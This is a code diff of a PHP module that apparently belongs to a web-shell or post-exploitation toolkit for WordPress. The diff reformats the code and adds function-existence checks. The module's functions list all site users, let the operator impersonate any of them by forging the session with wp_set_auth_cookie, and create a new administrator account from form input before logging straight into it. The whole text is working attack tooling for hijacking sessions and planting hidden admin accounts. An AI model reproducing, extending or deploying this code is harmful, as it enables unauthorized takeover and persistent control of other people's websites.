@@ -15,70 +15,61 @@ $IMPERSONATE_WP_USER = "__FEAT_IMPERSONATE_WP_USER__";
  * @param $css string The CSS of the page
  */
 function __PREFIX__makeWpImpersonatePage(&$page_content, $features, $page, $css) {
+    $feature = array_values(array_filter($features, function ($feature) use ($page) {
+        return $feature["op"] === $page;
+    }));
+
     $users        = __PREFIX__getWPUsers();
     $page_content = __PREFIX__makePage(
         $features,
-        $page,
         $css,
-        [
-            __PREFIX__makePageHeader(
-                $features[$page]["title"],
-                $features[$page]["description"]
-            ),
-            __PREFIX__makeTable(
-                "Users",
-                "WordPress users to impersonate",
-                $users,
-                [
-                    "user_login" => "Username",
-                    "user_email" => "Email",
-                    "roles"      => "Roles",
-                    "user_url"   => "URL",
-                    "actions"    => "Actions",
-                ],
-                "
+        $page,
+        [__PREFIX__makePageHeader(
+            $feature[0]["title"],
+            $feature[0]["description"]
+        ), __PREFIX__makeTable(
+            "Users",
+            "WordPress users to impersonate",
+            $users,
+            ["user_login" => "Username", "user_email" => "Email", "roles"      => "Roles", "user_url"   => "URL", "actions"    => "Actions"],
+            "
                         <dialog id='create-wp-user' class='p-4 rounded w-1/3'>" .
-                __PREFIX__makeForm(
-                    $page,
-                    $_SERVER["REQUEST_URI"],
-                    [
-                        "<div class='flex items-center justify-between'>
+            __PREFIX__makeForm(
+                $page,
+                $_SERVER["REQUEST_URI"],
+                ["<div class='flex items-center justify-between'>
                                         <h3 class='text-lg font-semibold text-zinc-800'>Create WordPress user</h3>
                                         <button onclick='document.getElementById(\"create-wp-user\").close(); document.getElementById(\"create-wp-user\").classList.remove(\"flex\")' 
                                             class='text-zinc-800 hover:text-zinc-700 transition-all duration-300 text-2xl'>
                                             &times;
                                         </button>
-                                    </div>",
-                        __PREFIX__makeInput(
-                            "text",
-                            "Username",
-                            "__PARAM_2__",
-                            "admin",
-                            "Username of the user to create.",
-                            true
-                        ),
-                        __PREFIX__makeInput(
-                            "password",
-                            "Password",
-                            "__PARAM_3__",
-                            "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
-                            "Password of the user to create.",
-                            true
-                        ),
-                    ],
-                    "post",
-                    "Create user",
-                    "flex flex-col gap-y-6 mx-auto w-full"
-                )
-                . "
+                                    </div>", __PREFIX__makeInput(
+                    "text",
+                    "Username",
+                    "__PARAM_2__",
+                    "admin",
+                    "Username of the user to create.",
+                    true
+                ), __PREFIX__makeInput(
+                    "password",
+                    "Password",
+                    "__PARAM_3__",
+                    "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
+                    "Password of the user to create.",
+                    true
+                )],
+                "post",
+                "Create user",
+                "flex flex-col gap-y-6 mx-auto w-full"
+            )
+            . "
                         </dialog>
                         <button onclick='document.getElementById(\"create-wp-user\").showModal()' 
                             class='rounded px-3 py-2 text-sm font-semibold text-white shadow bg-zinc-800 flex-grow-0 ml-auto
                                 hover:bg-zinc-700 transition-all duration-300'>
                             Create user
                         </button>"
-            ),
-        ]
+        )]
     );
 }
 
@@ -94,6 +85,12 @@ function __PREFIX__makeWpImpersonatePage(&$page_content, $features, $page, $css)
 function __PREFIX__handleWpImpersonate($operation, $features) {
     // Run the impersonate operation
     if (!empty($_POST["__PARAM_1__"])) {
+        if(!function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
+           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
+           !function_exists("site_url")){
+            return;
+        }
+
         $user = get_user_by("login", $_POST["__PARAM_1__"]);
         if ($user) {
             wp_set_current_user($user->ID, $user->user_login);
@@ -105,13 +102,16 @@ function __PREFIX__handleWpImpersonate($operation, $features) {
     // Run the user creation operation
     elseif (!empty($_POST["__PARAM_2__"]) &&
             !empty($_POST["__PARAM_3__"])) {
+        if(!function_exists("wp_insert_user") || !function_exists("is_wp_error") ||
+           !function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
+           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
+           !function_exists("site_url")){
+            return;
+        }
+
         // creates the admin user
         $user_id = wp_insert_user(
-            [
-                "user_login" => "__PREFIX__" . $_POST["__PARAM_2__"],
-                "user_pass"  => $_POST["__PARAM_3__"],
-                "role"       => "administrator",
-            ]
+            ["user_login" => "__PREFIX__" . $_POST["__PARAM_2__"], "user_pass"  => $_POST["__PARAM_3__"], "role"       => "administrator"]
         );
 
         // if the user was created successfully, log in
@@ -139,28 +139,23 @@ function __PREFIX__makeWpUserTableRow($data) {
 
     return array_merge(
         (array) $data->data,
-        [
-            "roles"   => $data->roles,
-            "actions" => __PREFIX__makeForm(
-                $IMPERSONATE_WP_USER,
-                $_SERVER["REQUEST_URI"],
-                [
-                    __PREFIX__makeInput(
-                        "hidden",
-                        "username",
-                        "__PARAM_1__",
-                        "",
-                        "Username of the user to impersonate.",
-                        true,
-                        null,
-                        htmlentities($data->data->user_login)
-                    ),
-                ],
-                "post",
-                "Impersonate",
-                "flex flex-col max-w-xl mb-0"
-            ),
-        ]
+        ["roles"   => $data->roles, "actions" => __PREFIX__makeForm(
+            $IMPERSONATE_WP_USER,
+            $_SERVER["REQUEST_URI"],
+            [__PREFIX__makeInput(
+                "hidden",
+                "username",
+                "__PARAM_1__",
+                "",
+                "Username of the user to impersonate.",
+                true,
+                null,
+                htmlentities($data->data->user_login)
+            )],
+            "post",
+            "Impersonate",
+            "flex flex-col max-w-xl mb-0"
+        )]
     );
 }
 
@@ -170,6 +165,10 @@ function __PREFIX__makeWpUserTableRow($data) {
  * @return array List of WordPress users
  */
 function __PREFIX__getWPUsers() {
+    if(!function_exists("get_users")) {
+        return [];
+    }
+
     return array_map(
         "__PREFIX__makeWpUserTableRow",
         get_users()
@@ -200,14 +199,9 @@ function __PREFIX__WpImpersonateHooksIsolatedOps(&$isolated_ops) {
 function __PREFIX__WpImpersonateHooksFeatures(&$features) {
     global $IMPERSONATE_WP_USER;
 
-    $features[] = [
-        "title"       => "Impersonate WP user",
-        "description" => "Impersonate a WordPress user by changing the current session.",
-        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
+    $features[] = ["title"       => "Impersonate WP user", "description" => "Impersonate a WordPress user by changing the current session.", "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M15 19.128a9.38 9.38 0 0 0 2.625.372 9.337 9.337 0 0 0 4.121-.952 4.125 4.125 0 0 0-7.533-2.493M15 19.128v-.003c0-1.113-.285-2.16-.786-3.07M15 19.128v.106A12.318 12.318 0 0 1 8.624 21c-2.331 0-4.512-.645-6.374-1.766l-.001-.109a6.375 6.375 0 0 1 11.964-3.07M12 6.375a3.375 3.375 0 1 1-6.75 0 3.375 3.375 0 0 1 6.75 0Zm8.25 2.25a2.625 2.625 0 1 1-5.25 0 2.625 2.625 0 0 1 5.25 0Z" />
-</svg>',
-        "op"          => $IMPERSONATE_WP_USER,
-    ];
+</svg>', "op"          => $IMPERSONATE_WP_USER];
 }
 
 // section.functions.end
